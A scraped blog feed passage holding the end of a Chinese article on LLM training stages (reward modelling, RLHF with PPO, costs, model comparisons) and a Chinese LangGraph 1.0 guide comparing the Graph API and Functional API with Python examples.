<span class="hljs-keyword">def</span> <span class="hljs-title function_">train_reward_model</span>(<span class="hljs-params">question, answer_a, answer_b, human_preference</span>):
    score_a = reward_model(question, answer_a)
    score_b = reward_model(question, answer_b)
    
    <span class="hljs-keyword">if</span> human_preference == <span class="hljs-string">"A"</span>:
        <span class="hljs-comment"># A应该得分更高</span>
        loss = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, score_b - score_a + margin)
    <span class="hljs-keyword">else</span>:
        loss = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, score_a - score_b + margin)
    
    <span class="hljs-keyword">return</span> loss
</code></pre>
<p>这个设计很聪明：不需要给答案打绝对分数，只需要比较相对好坏。标注起来简单多了。</p>
<h3 data-id="heading-12">人类偏好数据</h3>
<p>这部分数据量不大，一般就几万条。但质量要求很高，因为这直接决定了模型的价值观和回答风格。</p>
<h2 data-id="heading-13">第四步：强化学习（RLHF）</h2>
<p>最后一步是用强化学习来优化模型。RLHF就是"从人类反馈中强化学习"。</p>
<h3 data-id="heading-14">RLHF的核心思想</h3>
<p>让模型不断尝试生成答案，用奖励模型打分，然后调整策略，追求更高的分数。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[用户问题] --&gt; B[模型生成回答]
    B --&gt; C[奖励模型打分]
    C --&gt; D{分数高吗?}
    D --&gt;|高| E[增强这种回答方式]
    D --&gt;|低| F[抑制这种回答方式]
    E --&gt; B
    F --&gt; B
    
    style C fill:#667eea,color:#fff
    style E fill:#27ae60,color:#fff
    style F fill:#e74c3c,color:#fff
</code></pre>
<p>这个过程类似训练。回答好了就鼓励，回答不好就纠正。模型逐渐学会什么样的回答能获得高分。</p>
<h3 data-id="heading-15">PPO算法</h3>
<p>RLHF用的是PPO（近端策略优化）算法。核心思想是：每次更新策略的时候，不要改得太猛，保持稳定。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># PPO的简化版本</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">ppo_update</span>(<span class="hljs-params">model, question, old_answer, reward</span>):
    new_answer = model(question)
    
    <span class="hljs-comment"># 计算策略比值</span>
    ratio = prob(new_answer) / prob(old_answer)
    
    <span class="hljs-comment"># Clip防止变化太大</span>
    clipped_ratio = clip(ratio, <span class="hljs-number">1</span>-epsilon, <span class="hljs-number">1</span>+epsilon)
    
    <span class="hljs-comment"># 选较小的那个</span>
    loss = -<span class="hljs-built_in">min</span>(ratio * reward, clipped_ratio * reward)
    
    <span class="hljs-keyword">return</span> loss
</code></pre>
<p>Clip机制是为了防止策略突变，导致模型性能下降。</p>
<h3 data-id="heading-16">RLHF的迭代循环</h3>
<p>RLHF不是一次性的，而是持续进行的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[当前模型] --&gt; B[生成回答]
    B --&gt; C[奖励模型评分]
    C --&gt; D[PPO更新]
    D --&gt; A
    
    E[收集新的人类反馈] --&gt; F[更新奖励模型]
    F --&gt; C
    
    style A fill:#667eea,color:#fff
    style D fill:#764ba2,color:#fff
    style F fill:#f093fb,color:#fff
</code></pre>
<p>ChatGPT就是这样不断迭代优化的。用户的每个反馈最终都会用来改进模型。</p>
<h2 data-id="heading-17">数据和成本</h2>
<h2 data-id="heading-18">数据和成本</h2>
<p>训练大模型需要多少钱？看看不同规模模型的成本对比：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph 小模型7B
        A1[硬件: 8卡A100] --&gt; B1[时间: 1-2周]
        B1 --&gt; C1[成本: 几万人民币]
    end
    
    subgraph 中模型70B
        A2[硬件: 64卡A100] --&gt; B2[时间: 1-2个月]
        B2 --&gt; C2[成本: 几百万]
    end
    
    subgraph 大模型175B+
        A3[硬件: 几千卡A100] --&gt; B3[时间: 3-6个月]
        B3 --&gt; C3[成本: 数亿人民币]
    end
    
    style C1 fill:#27ae60,color:#fff
    style C2 fill:#f39c12,color:#fff
    style C3 fill:#e74c3c,color:#fff
</code></pre>
<p>LLaMA 3.1的训练成本估计在5-10亿人民币，GPT-4可能更贵。这就是为什么只有大公司才能训练顶级模型。</p>
<h3 data-id="heading-19">数据准备的挑战</h3>
<p>数据准备是最耗时的环节：</p>
<ol>
<li><strong>预训练数据</strong>：要去重、过滤低质量内容、去除有害信息</li>
<li><strong>微调数据</strong>：需要人工编写或筛选，质量控制很难</li>
<li><strong>偏好数据</strong>：标注员要理解任务，还要保持一致性</li>
</ol>
<h2 data-id="heading-20">主流模型对比</h2>
<p>现在开源和闭源的大模型越来越多，看看几个主流的：</p>









































<table><thead><tr><th>模型</th><th>参数量</th><th>训练数据</th><th>特点</th></tr></thead><tbody><tr><td>GPT-3.5</td><td>175B</td><td>未公开</td><td>最早流行的对话模型</td></tr><tr><td>GPT-4</td><td>未公开</td><td>未公开</td><td>多模态，性能最强</td></tr><tr><td>LLaMA 3</td><td>8B/70B/405B</td><td>15T tokens</td><td>开源，性能接近GPT-4</td></tr><tr><td>Claude</td><td>未公开</td><td>未公开</td><td>长上下文，安全性好</td></tr><tr><td>Qwen</td><td>7B/14B/72B</td><td>3T tokens</td><td>中文友好</td></tr></tbody></table>
<p>选择建议：</p>
<ul>
<li><strong>追求性能</strong>：GPT-4或Claude 3.5</li>
<li><strong>中文场景</strong>：Qwen或ChatGLM</li>
<li><strong>私有部署</strong>：LLaMA 3</li>
<li><strong>资源受限</strong>：7B小模型 + 微调</li>
</ul>
<h2 data-id="heading-21">几点理解</h2>
<h3 data-id="heading-22">1. 数据是核心资产</h3>
<p>预训练用了15万亿token，但微调可能只要几十万条。奖励模型的人类偏好数据更是只有几万条。</p>
<p><strong>高质量的人类反馈数据是核心竞争力。</strong> 这也是为什么大公司能保持领先的重要原因。</p>
<h3 data-id="heading-23">2. 训练是持续的过程</h3>
<p>RLHF不是训练完就结束了。ChatGPT每周都在更新，不断收集用户反馈，优化模型。</p>
<p>模型部署后的运营维护，可能比初始训练还重要。</p>
<h3 data-id="heading-24">3. 对齐是个大挑战</h3>
<p>最难的不是让AI变聪明，而是让AI的目标和人类一致。RLHF是目前最好的对齐方案，但还不完美。</p>
<p>有时候模型会过度迎合，有时候又会产生不当输出。这个平衡一直在探索。</p>
<h2 data-id="heading-25">实践建议</h2>
<p>根据不同角色，给一些实际应用的建议：</p>
<p><strong>如果你是研究者</strong>：</p>
<ul>
<li>从小模型（7B）开始实验，成本可控</li>
<li>重点研究RLHF和对齐问题，这是核心难点</li>
<li>关注DPO等新范式</li>
</ul>
<p><strong>如果你是企业</strong>：</p>
<ul>
<li>优先用API（GPT-4/Claude），成本和效果最优</li>
<li>数据敏感的话，考虑私有部署LLaMA</li>
<li>积累自己的标注数据，这是长期资产</li>
</ul>
<p><strong>如果你是开发者</strong>：</p>
<ul>
<li>学习Prompt Engineering，这是最快上手的方式</li>
<li>掌握微调技术，能解决很多定制化问题</li>
<li>了解RAG（检索增强生成），补充模型知识</li>
</ul>
<h2 data-id="heading-26">写在最后</h2>
<p>大模型训练是个系统工程，涉及数据、算法、工程、成本等多个方面。从预训练到RLHF，每个阶段都有自己的挑战。</p>
<p>现在开源模型越来越多，个人开发者也有机会参与到这个领域。无论是研究、应用还是创业，都有很多机会。</p>
<p>你在用大模型做什么项目？训练或微调过程中遇到过什么问题？对文章里的内容有什么看法？欢迎在评论区交流讨论，一起学习进步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph1.0智能体开发：选择API]]></title>    <link>https://juejin.cn/post/7575457788663808052</link>    <guid>https://juejin.cn/post/7575457788663808052</guid>    <pubDate>2025-11-24T02:02:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788663808052" data-draft-id="7575412016405364746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangGraph1.0智能体开发：选择API"/> <meta itemprop="keywords" content="LangChain,Agent,Python"/> <meta itemprop="datePublished" content="2025-11-24T02:02:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangGraph1.0智能体开发：选择API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:02:03.000Z" title="Mon Nov 24 2025 02:02:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>LangGraph提供两种不同的API用于构建智能体工作流：Graph API和Functional API。这两种 API 共享相同的底层运行时环境，且可在同一应用中搭配使用，但它们针对不同的使用场景和开发偏好设计。
本文旨在帮助开发者根据自身具体需求，了解何时应使用哪种API。</p>
<h2 data-id="heading-0">一、快速决策指南</h2>
<p>当你需要以下功能时，使用图 API（Graph API）：</p>
<ul>
<li>用于调试和文档记录的复杂工作流可视化</li>
<li>支持多节点共享数据的显式状态管理</li>
<li>包含多个决策点的条件分支</li>
<li>后续需合并的并行执行路径</li>
<li>可通过可视化呈现辅助理解的团队协作场景</li>
</ul>
<p>当你需要以下功能时，使用函数式 API（Functional API）：</p>
<ul>
<li>对现有过程式代码的改动最小化</li>
<li>标准控制流（if/else 条件判断、循环、函数调用）</li>
<li>无需显式状态管理的函数作用域状态</li>
<li>更少模板代码（boilerplate）的快速原型开发</li>
<li>仅含简单分支逻辑的线性工作流</li>
</ul>
<h2 data-id="heading-1">二、详细对比</h2>
<h3 data-id="heading-2">2.1 何时使用图 API（Graph API）</h3>
<p>图API采用声明式方法（declarative approach），通过定义节点（nodes）、边（edges）和共享状态（shared state）来创建可视化的图结构（visual graph structure）。</p>
<h4 data-id="heading-3">1. 复杂决策树与分支逻辑</h4>
<p>当你的工作流包含多个依赖于不同条件的决策点（decision points）时，图 API 能让这些分支清晰可见，且易于可视化呈现。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Graph API: Clear visualization of decision paths</span>
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    messages: <span class="hljs-built_in">list</span>
    current_tool: <span class="hljs-built_in">str</span>
    retry_count: <span class="hljs-built_in">int</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">should_continue</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">if</span> state[<span class="hljs-string">"retry_count"</span>] &gt; <span class="hljs-number">3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"end"</span>
    <span class="hljs-keyword">elif</span> state[<span class="hljs-string">"current_tool"</span>] == <span class="hljs-string">"search"</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"process_search"</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"call_llm"</span>

workflow = StateGraph(AgentState)
workflow.add_node(<span class="hljs-string">"call_llm"</span>, call_llm_node)
workflow.add_node(<span class="hljs-string">"process_search"</span>, search_node)
workflow.add_conditional_edges(<span class="hljs-string">"call_llm"</span>, should_continue)
</code></pre>
<h4 data-id="heading-4">2. 跨多个组件的状态管理</h4>
<p>当你需要在工作流的不同部分之间共享并协调状态时，图 API（Graph API）的显式状态管理（explicit state management）机制将发挥重要作用。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Multiple nodes can access and modify shared state</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkflowState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    user_input: <span class="hljs-built_in">str</span>
    search_results: <span class="hljs-built_in">list</span>
    generated_response: <span class="hljs-built_in">str</span>
    validation_status: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># Access shared state</span>
    results = search(state[<span class="hljs-string">"user_input"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"search_results"</span>: results}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">validation_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># Access results from previous node</span>
    is_valid = validate(state[<span class="hljs-string">"generated_response"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"validation_status"</span>: <span class="hljs-string">"valid"</span> <span class="hljs-keyword">if</span> is_valid <span class="hljs-keyword">else</span> <span class="hljs-string">"invalid"</span>}
</code></pre>
<h4 data-id="heading-5">3. 带同步机制的并行处理</h4>
<p>当你需要并行运行多个操作，随后再合并它们的结果时，图 API（Graph API）能自然地处理这一需求。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Parallel processing of multiple data sources</span>
workflow.add_node(<span class="hljs-string">"fetch_news"</span>, fetch_news)
workflow.add_node(<span class="hljs-string">"fetch_weather"</span>, fetch_weather)
workflow.add_node(<span class="hljs-string">"fetch_stocks"</span>, fetch_stocks)
workflow.add_node(<span class="hljs-string">"combine_data"</span>, combine_all_data)

<span class="hljs-comment"># All fetch operations run in parallel</span>
workflow.add_edge(START, <span class="hljs-string">"fetch_news"</span>)
workflow.add_edge(START, <span class="hljs-string">"fetch_weather"</span>)
workflow.add_edge(START, <span class="hljs-string">"fetch_stocks"</span>)

<span class="hljs-comment"># Combine waits for all parallel operations to complete</span>
workflow.add_edge(<span class="hljs-string">"fetch_news"</span>, <span class="hljs-string">"combine_data"</span>)
workflow.add_edge(<span class="hljs-string">"fetch_weather"</span>, <span class="hljs-string">"combine_data"</span>)
workflow.add_edge(<span class="hljs-string">"fetch_stocks"</span>, <span class="hljs-string">"combine_data"</span>)
</code></pre>
<h4 data-id="heading-6">4. 团队开发与文档编制</h4>
<p>图 API（Graph API）的可视化特性，使得团队更易于理解、记录和维护复杂的工作流。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Clear separation of concerns - each team member can work on different nodes</span>
workflow.add_node(<span class="hljs-string">"data_ingestion"</span>, data_team_function)
workflow.add_node(<span class="hljs-string">"ml_processing"</span>, ml_team_function)
workflow.add_node(<span class="hljs-string">"business_logic"</span>, product_team_function)
workflow.add_node(<span class="hljs-string">"output_formatting"</span>, frontend_team_function)
</code></pre>
<h3 data-id="heading-7">2.2 何时使用函数式 API（Functional API）</h3>
<p>函数式 API 采用命令式方法（imperative approach），可将LangGraph功能集成到标准的过程式代码中。</p>
<h4 data-id="heading-8">1. 对现有过程式代码的改动最小化</h4>
<p>当你已拥有使用标准控制流（standard control flow）的代码，且希望通过最少的重构（minimal refactoring）为其添加 LangGraph 功能时，适合使用函数式 API。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Functional API: Minimal changes to existing code</span>
<span class="hljs-keyword">from</span> langgraph.func <span class="hljs-keyword">import</span> entrypoint, task

<span class="hljs-meta">@task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_input</span>(<span class="hljs-params">user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Existing function with minimal changes</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed"</span>: user_input.lower().strip()}

<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">workflow</span>(<span class="hljs-params">user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># Standard Python control flow</span>
    processed = process_user_input(user_input).result()

    <span class="hljs-keyword">if</span> <span class="hljs-string">"urgent"</span> <span class="hljs-keyword">in</span> processed[<span class="hljs-string">"processed"</span>]:
        response = handle_urgent_request(processed).result()
    <span class="hljs-keyword">else</span>:
        response = handle_normal_request(processed).result()

    <span class="hljs-keyword">return</span> response
</code></pre>
<h4 data-id="heading-9">2. 具有简单逻辑的线性工作流</h4>
<p>当你的工作流以顺序执行为主，且仅包含简单的条件逻辑时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">essay_workflow</span>(<span class="hljs-params">topic: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Linear flow with simple branching</span>
    outline = create_outline(topic).result()

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(outline[<span class="hljs-string">"points"</span>]) &lt; <span class="hljs-number">3</span>:
        outline = expand_outline(outline).result()

    draft = write_draft(outline).result()

    <span class="hljs-comment"># Human review checkpoint</span>
    feedback = interrupt({<span class="hljs-string">"draft"</span>: draft, <span class="hljs-string">"action"</span>: <span class="hljs-string">"Please review"</span>})

    <span class="hljs-keyword">if</span> feedback == <span class="hljs-string">"approve"</span>:
        final_essay = draft
    <span class="hljs-keyword">else</span>:
        final_essay = revise_essay(draft, feedback).result()

    <span class="hljs-keyword">return</span> {<span class="hljs-string">"essay"</span>: final_essay}
</code></pre>
<h4 data-id="heading-10">3. 快速原型开发</h4>
<p>当你希望快速测试想法，且不想承担定义状态模式（state schemas）和图结构（graph structures）的额外开销时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">quick_prototype</span>(<span class="hljs-params">data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Fast iteration - no state schema needed</span>
    step1_result = process_step1(data).result()
    step2_result = process_step2(step1_result).result()

    <span class="hljs-keyword">return</span> {<span class="hljs-string">"final_result"</span>: step2_result}
</code></pre>
<h4 data-id="heading-11">4. 函数作用域内的状态管理</h4>
<p>当你的状态天然适合限定在单个函数的作用域内，且无需进行大范围共享时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_document</span>(<span class="hljs-params">document: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Local state management within function</span>
    sections = extract_sections(document)
    summaries = [summarize(section) <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> sections]
    key_points = extract_key_points(summaries)

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"sections"</span>: <span class="hljs-built_in">len</span>(sections),
        <span class="hljs-string">"summaries"</span>: summaries,
        <span class="hljs-string">"key_points"</span>: key_points
    }

<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">document_processor</span>(<span class="hljs-params">document: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    analysis = analyze_document(document).result()
    <span class="hljs-comment"># State is passed between functions as needed</span>
    <span class="hljs-keyword">return</span> generate_report(analysis).result()
</code></pre>
<h2 data-id="heading-12">三、组合使用两种API</h2>
<p>你可以在同一个应用中同时使用这两种 API。当系统的不同部分有不同需求时，这种方式会非常实用。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph
<span class="hljs-keyword">from</span> langgraph.func <span class="hljs-keyword">import</span> entrypoint

<span class="hljs-comment"># Complex multi-agent coordination using Graph API</span>
coordination_graph = StateGraph(CoordinationState)
coordination_graph.add_node(<span class="hljs-string">"orchestrator"</span>, orchestrator_node)
coordination_graph.add_node(<span class="hljs-string">"agent_a"</span>, agent_a_node)
coordination_graph.add_node(<span class="hljs-string">"agent_b"</span>, agent_b_node)

<span class="hljs-comment"># Simple data processing using Functional API</span>
<span class="hljs-meta">@entrypoint()</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">data_processor</span>(<span class="hljs-params">raw_data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    cleaned = clean_data(raw_data).result()
    transformed = transform_data(cleaned).result()
    <span class="hljs-keyword">return</span> transformed

<span class="hljs-comment"># Use the functional API result in the graph</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">orchestrator_node</span>(<span class="hljs-params">state</span>):
    processed_data = data_processor.invoke(state[<span class="hljs-string">"raw_data"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed_data"</span>: processed_data}
</code></pre>
<h2 data-id="heading-13">四、API间的迁移</h2>
<h3 data-id="heading-14">4.1 从函数式API迁移至图API</h3>
<p>当你的函数式工作流变得复杂时，可按以下方式迁移至图 API：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Before: Functional API</span>
<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">complex_workflow</span>(<span class="hljs-params">input_data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    step1 = process_step1(input_data).result()

    <span class="hljs-keyword">if</span> step1[<span class="hljs-string">"needs_analysis"</span>]:
        analysis = analyze_data(step1).result()
        <span class="hljs-keyword">if</span> analysis[<span class="hljs-string">"confidence"</span>] &gt; <span class="hljs-number">0.8</span>:
            result = high_confidence_path(analysis).result()
        <span class="hljs-keyword">else</span>:
            result = low_confidence_path(analysis).result()
    <span class="hljs-keyword">else</span>:
        result = simple_path(step1).result()

    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># After: Graph API</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkflowState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    input_data: <span class="hljs-built_in">dict</span>
